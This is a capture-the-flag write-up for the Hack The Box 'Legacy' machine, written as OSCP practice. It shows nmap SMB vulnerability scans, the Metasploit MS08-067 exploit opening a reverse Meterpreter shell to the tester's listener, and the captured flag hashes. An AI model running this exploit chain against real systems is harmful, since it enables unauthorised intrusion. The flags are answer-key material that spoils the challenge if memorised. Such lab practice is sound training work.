@@ -1,0 +1,151 @@
+---
+layout: /src/layouts/PostLayout.astro
+title: Legacy
+tags: []
+---
+**Start 20:20 13/08**
+
+---
+```
+10.10.10.4
+```
+## Recon
+
+==Nmap==
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.10.4                      
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:18 IST
+Nmap scan report for 10.10.10.4
+Host is up (0.085s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -sT --script=smb-vuln* -T5 10.10.10.4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:29 IST
+Nmap scan report for 10.10.10.4
+Host is up (0.084s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.35 seconds
+
+```
+
+We see that this `samba` version is indeed vulnerable, and after looking it up online we find many exploits for it. Let's choose one of them.
+
+==Metasploit==
+We can use `metasploit` to search for a module that we can use in order to exploit this samba version:
+
+```bash
+msf6 > search CVE-2008-4250
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
+```
+
+We press `use 0` and then `show options` to display all our options.
+After setting `RHOSTS` to the target `IP_ADDR`, and `LHOST` to our own IP we can run the exploit.
+
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > run
+
+[*] Started reverse TCP handler on 10.10.14.24:4444 
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (176198 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.4:1038) at 2024-08-13 19:37:57 +0100
+
+meterpreter > 
+```
+
+Afterwards type `shell` to get a `Powershell shell`.
+
+```bash
+meterpreter > shell
+Process 288 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+```
+
+From here on it's a piece of cake. We got `root` permissions so we can get both flags in their respective directories.
+
+## Flags
+
+==user.txt==
+```powershell
+C:\Documents and Settings\john\Desktop>type user.txt
+type user.txt
+e69af0e4f443de7e36876fda4ec7644f
+```
+
+==root.txt==
+```powershell
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+993442d258b0e0ec917cae9e695d5713
+```
+
+![](../../../assets/0c6c1adb2b45cae6cb027840756a08d7.png)
+
+---
+
+**Finished 20:47 13/08**
+
+[^Links]: [[Hack The Box]] [[OSCP Prep]]
